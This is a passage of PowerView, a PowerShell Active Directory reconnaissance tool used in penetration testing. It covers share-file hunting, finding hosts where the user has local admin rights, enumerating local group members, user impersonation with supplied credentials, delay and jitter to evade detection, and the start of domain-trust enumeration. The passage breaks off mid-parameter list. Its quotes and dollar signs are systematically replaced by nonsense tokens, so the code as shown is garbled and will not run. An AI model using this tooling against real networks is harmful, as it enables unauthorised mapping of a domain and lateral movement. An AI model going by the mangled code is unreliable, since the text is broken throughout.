                            if ((RaUShareName) -and (RaUShareName.Trim() -ne q4gUq4gU)) {
                                # skip this share if itq4gUs in the exclude list
                                if (RaUExcludedShares -NotContains RaUShareName) {
                                    # check if the user has access to this path
                                    try {
                                        RaUNull = [IO.Directory]::GetFiles(RaUPath)
                                        RaUSearchShares += RaUPath
                                    }
                                    catch {
                                        Write-Verbose Oj8X[!] No access to RaUPathOj8X
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (RaUShare in RaUSearchShares) {
                    Write-Verbose Oj8XSearching share: RaUShareOj8X
                    RaUSearchArgs = @{
                        q4gUPathq4gU = RaUShare
                        q4gUIncludeq4gU = RaUInclude
                    }
                    if (RaUOfficeDocs) {
                        RaUSearchArgs[q4gUOfficeDocsq4gU] = RaUOfficeDocs
                    }
                    if (RaUFreshEXEs) {
                        RaUSearchArgs[q4gUFreshEXEsq4gU] = RaUFreshEXEs
                    }
                    if (RaULastAccessTime) {
                        RaUSearchArgs[q4gULastAccessTimeq4gU] = RaULastAccessTime
                    }
                    if (RaULastWriteTime) {
                        RaUSearchArgs[q4gULastWriteTimeq4gU] = RaULastWriteTime
                    }
                    if (RaUCreationTime) {
                        RaUSearchArgs[q4gUCreationTimeq4gU] = RaUCreationTime
                    }
                    if (RaUCheckWriteAccess) {
                        RaUSearchArgs[q4gUCheckWriteAccessq4gU] = RaUCheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if (RaUTokenHandle) {
                Invoke-RevertToSelf
            }
        }

        RaULogonToken = RaUNull
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
            }
            else {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-InterestingDomainShareFile] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-InterestingDomainShareFile] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-InterestingDomainShareFile] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUInclude, RaUExcludedShares, RaUOfficeDocs, RaUExcludeHidden, RaUFreshEXEs, RaUCheckWriteAccess, RaULogonToken
            }
        }
        else {
            Write-Verbose Oj8X[Find-InterestingDomainShareFile] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUIncludeq4gU = RaUInclude
                q4gUExcludedSharesq4gU = RaUExcludedShares
                q4gUOfficeDocsq4gU = RaUOfficeDocs
                q4gUExcludeHiddenq4gU = RaUExcludeHidden
                q4gUFreshEXEsq4gU = RaUFreshEXEs
                q4gUCheckWriteAccessq4gU = RaUCheckWriteAccess
                q4gUTokenHandleq4gU = RaULogonToken
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Find-LocalAdminAccess {
<#
.SYNOPSIS

Finds machines on the local domain where the current user has local administrator access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and for each computer it checks if the current user
has local administrator access using Test-AdminAccess. If -Credential is passed,
then Invoke-UserImpersonation is used to impersonate the specified user
before enumeration, reverting after with Invoke-RevertToSelf.

Idea adapted from the local_admin_search_enum post module in Metasploit written by:
    q4gUBrandon McCann Oj8XzeknoxOj8X <bmccann[at]accuvant.com>q4gU
    q4gUThomas McCarthy Oj8XsmilingraccoonOj8X <smilingraccoon[at]gmail.com>q4gU
    q4gURoyce Davis Oj8Xr3dyOj8X <rdavis[at]accuvant.com>q4gU

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-LocalAdminAccess

Finds machines in the current domain the current user has admin access to.

.EXAMPLE

Find-LocalAdminAccess -Domain dev.testlab.local

Finds machines in the dev.testlab.local domain the current user has admin access to.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-LocalAdminAccess -Domain testlab.local -Credential RaUCred

Finds machines in the testlab.local domain that the user with the specified -Credential
has admin access to.

.OUTPUTS

String

Computer dnshostnames the current user has administrative access to.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Switch]
        RaUCheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {
        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) { RaUComputerSearcherArguments[q4gUUnconstrainedq4gU] = RaUUnconstrained }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            Write-Verbose q4gU[Find-LocalAdminAccess] Querying computers in the domainq4gU
            RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Oj8X[Find-LocalAdminAccess] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-LocalAdminAccess] No hosts found to enumerateq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUTokenHandle)

            if (RaUTokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                RaUNull = Invoke-UserImpersonation -TokenHandle RaUTokenHandle -Quiet
            }

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    # check if the current user has local admin access to this server
                    RaUAccess = Test-AdminAccess -ComputerName RaUTargetComputer
                    if (RaUAccess.IsAdmin) {
                        RaUTargetComputer
                    }
                }
            }

            if (RaUTokenHandle) {
                Invoke-RevertToSelf
            }
        }

        RaULogonToken = RaUNull
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
            }
            else {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-LocalAdminAccess] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-LocalAdminAccess] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-LocalAdminAccess] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaULogonToken
            }
        }
        else {
            Write-Verbose Oj8X[Find-LocalAdminAccess] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUTokenHandleq4gU = RaULogonToken
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }
}


function Find-DomainLocalGroupMember {
<#
.SYNOPSIS

Enumerates the members of specified local group (default administrators)
for all the targeted machines on the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the members of the specified local
group (default of Administrators) for each machine using Get-NetLocalGroupMember.
By default, the API method is used, but this can be modified with q4gU-Method winntq4gU
to use the WinNT service provider.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X. Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to Oj8XAdministratorsOj8X.

.PARAMETER Method

The collection method to use, defaults to q4gUAPIq4gU, also accepts q4gUWinNTq4gU.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainLocalGroupMember

Enumerates the local group memberships for all reachable machines in the current domain.

.EXAMPLE

Find-DomainLocalGroupMember -Domain dev.testlab.local

Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential RaUCred

Enumerates the local group memberships for all reachable machines the dev.testlab.local
domain using the alternate credentials.

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.LocalGroupMember.APIq4gU)]
    [OutputType(q4gUPowerView.LocalGroupMember.WinNTq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDNSHostNameq4gU)]
        [String[]]
        RaUComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUOperatingSystemq4gU)]
        [String]
        RaUComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUServicePackq4gU)]
        [String]
        RaUComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSiteNameq4gU)]
        [String]
        RaUComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUGroupName = q4gUAdministratorsq4gU,

        [ValidateSet(q4gUAPIq4gU, q4gUWinNTq4gU)]
        [Alias(q4gUCollectionMethodq4gU)]
        [String]
        RaUMethod = q4gUAPIq4gU,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        RaUDelay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        RaUJitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        RaUThreads = 20
    )

    BEGIN {
        RaUComputerSearcherArguments = @{
            q4gUPropertiesq4gU = q4gUdnshostnameq4gU
        }
        if (RaUPSBoundParameters[q4gUComputerDomainq4gU]) { RaUComputerSearcherArguments[q4gUDomainq4gU] = RaUComputerDomain }
        if (RaUPSBoundParameters[q4gUComputerLDAPFilterq4gU]) { RaUComputerSearcherArguments[q4gULDAPFilterq4gU] = RaUComputerLDAPFilter }
        if (RaUPSBoundParameters[q4gUComputerSearchBaseq4gU]) { RaUComputerSearcherArguments[q4gUSearchBaseq4gU] = RaUComputerSearchBase }
        if (RaUPSBoundParameters[q4gUUnconstrainedq4gU]) { RaUComputerSearcherArguments[q4gUUnconstrainedq4gU] = RaUUnconstrained }
        if (RaUPSBoundParameters[q4gUComputerOperatingSystemq4gU]) { RaUComputerSearcherArguments[q4gUOperatingSystemq4gU] = RaUOperatingSystem }
        if (RaUPSBoundParameters[q4gUComputerServicePackq4gU]) { RaUComputerSearcherArguments[q4gUServicePackq4gU] = RaUServicePack }
        if (RaUPSBoundParameters[q4gUComputerSiteNameq4gU]) { RaUComputerSearcherArguments[q4gUSiteNameq4gU] = RaUSiteName }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUComputerSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUComputerSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUComputerSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUComputerSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUComputerSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUComputerSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        if (RaUPSBoundParameters[q4gUComputerNameq4gU]) {
            RaUTargetComputers = RaUComputerName
        }
        else {
            Write-Verbose q4gU[Find-DomainLocalGroupMember] Querying computers in the domainq4gU
            RaUTargetComputers = Get-DomainComputer @ComputerSearcherArguments wZ5t Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose Oj8X[Find-DomainLocalGroupMember] TargetComputers length: RaU(RaUTargetComputers.Length)Oj8X
        if (RaUTargetComputers.Length -eq 0) {
            throw q4gU[Find-DomainLocalGroupMember] No hosts found to enumerateq4gU
        }

        # the host enumeration block weq4gUre using to enumerate all servers
        RaUHostEnumBlock = {
            Param(RaUComputerName, RaUGroupName, RaUMethod, RaUTokenHandle)

            # Add check if user defaults to/selects Oj8XAdministratorsOj8X
            if (RaUGroupName -eq Oj8XAdministratorsOj8X) {
                RaUAdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,RaUnull)
                RaUGroupName = (RaUAdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split Oj8XScKjScKjOj8X)[-1]
            }

            if (RaUTokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                RaUNull = Invoke-UserImpersonation -TokenHandle RaUTokenHandle -Quiet
            }

            ForEach (RaUTargetComputer in RaUComputerName) {
                RaUUp = Test-Connection -Count 1 -Quiet -ComputerName RaUTargetComputer
                if (RaUUp) {
                    RaUNetLocalGroupMemberArguments = @{
                        q4gUComputerNameq4gU = RaUTargetComputer
                        q4gUMethodq4gU = RaUMethod
                        q4gUGroupNameq4gU = RaUGroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if (RaUTokenHandle) {
                Invoke-RevertToSelf
            }
        }

        RaULogonToken = RaUNull
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
            }
            else {
                RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (RaUPSBoundParameters[q4gUDelayq4gU] -or RaUPSBoundParameters[q4gUStopOnSuccessq4gU]) {

            Write-Verbose Oj8X[Find-DomainLocalGroupMember] Total number of hosts: RaU(RaUTargetComputers.count)Oj8X
            Write-Verbose Oj8X[Find-DomainLocalGroupMember] Delay: RaUDelay, Jitter: RaUJitterOj8X
            RaUCounter = 0
            RaURandNo = New-Object System.Random

            ForEach (RaUTargetComputer in RaUTargetComputers) {
                RaUCounter = RaUCounter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds RaURandNo.Next((1-RaUJitter)*RaUDelay, (1+RaUJitter)*RaUDelay)

                Write-Verbose Oj8X[Find-DomainLocalGroupMember] Enumerating server RaUTargetComputer (RaUCounter of RaU(RaUTargetComputers.count))Oj8X
                Invoke-Command -ScriptBlock RaUHostEnumBlock -ArgumentList RaUTargetComputer, RaUGroupName, RaUMethod, RaULogonToken
            }
        }
        else {
            Write-Verbose Oj8X[Find-DomainLocalGroupMember] Using threading with threads: RaUThreadsOj8X

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction
            RaUScriptParams = @{
                q4gUGroupNameq4gU = RaUGroupName
                q4gUMethodq4gU = RaUMethod
                q4gUTokenHandleq4gU = RaULogonToken
            }

            # if weq4gUre using threading, kick off the script block with New-ThreadedFunction using the RaUHostEnumBlock + params
            New-ThreadedFunction -ComputerName RaUTargetComputers -ScriptBlock RaUHostEnumBlock -ScriptParameters RaUScriptParams -Threads RaUThreads
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-DomainTrust {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, and LDAP search using the filter
q4gU(objectClass=trustedDomain)q4gU is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .LDAP methods.

.EXAMPLE

Get-DomainTrust -NET -Domain Oj8Xprod.testlab.localOj8X

Return domain trusts for the Oj8Xprod.testlab.localOj8X domain using .NET methods

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainTrust -Domain Oj8Xprod.testlab.localOj8X -Server Oj8XPRIMARY.testlab.localOj8X -Credential RaUCred

Return domain trusts for the Oj8Xprod.testlab.localOj8X domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain Oj8Xprod.testlab.localOj8X

Return domain trusts for the Oj8Xprod.testlab.localOj8X domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.NETq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.LDAPq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.APIq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gULDAPq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [Parameter(ParameterSetName = q4gUAPIq4gU)]
        [Switch]
        RaUAPI,

        [Parameter(ParameterSetName = q4gUNETq4gU)]
        [Switch]
        RaUNET,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Parameter(ParameterSetName = q4gUAPIq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

